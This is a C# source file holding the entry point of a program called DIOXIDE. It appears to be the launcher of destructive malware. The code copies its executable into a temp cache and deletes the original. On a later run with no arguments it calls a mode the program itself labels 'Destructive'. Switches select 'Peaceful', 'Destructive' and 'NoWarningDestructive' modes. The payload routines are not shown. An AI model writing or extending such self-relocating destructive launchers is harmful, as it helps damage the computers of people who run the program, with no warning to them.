using System;
using System.IO;
using System.Windows.Forms;

namespace DIOXIDE
{
    class main
    {
        static void Main(string[] cmd)
        {
            Functions func = new Functions();
            Application.EnableVisualStyles();

            if (cmd.Length == 0)
            {
                if (File.Exists(func.TempPath + "Dioxide."))
                {
                    func.DeleteDioxideEXECache();
                    execute.executeD();
                }
                else
                {
                    func.DioxideEXECachCreate();
                    func.DioxideEXECopy();
                    func.DeleteDioxideEXE();
                }
            }
            else
            {
                for (int i = 0; i < cmd.Length; i++)
                {
                    if (cmd[i] == "/P")
                    {
                        execute.executeP();
                    }
                    if (cmd[i] == "/D")
                    {
                        execute.executeD();
                    }
                    if (cmd[i] == "/NWD")
                    {
                        execute.executeNWD();
                    }
                    if (cmd[i] == "/EWP")
                    {
                        execute.executeEWP();
                    }
                    if (cmd[i] == "/help")
                    {
                        MessageBox.Show("/P Peaceful" + Environment.NewLine + "/D Destructive" + Environment.NewLine + "/NWD NoWarningDestructive" + Environment.NewLine + "/EWP EnabledWarningPeaceful", "help", MessageBoxButtons.OK);
                    }
                }
            }
        }
    }
}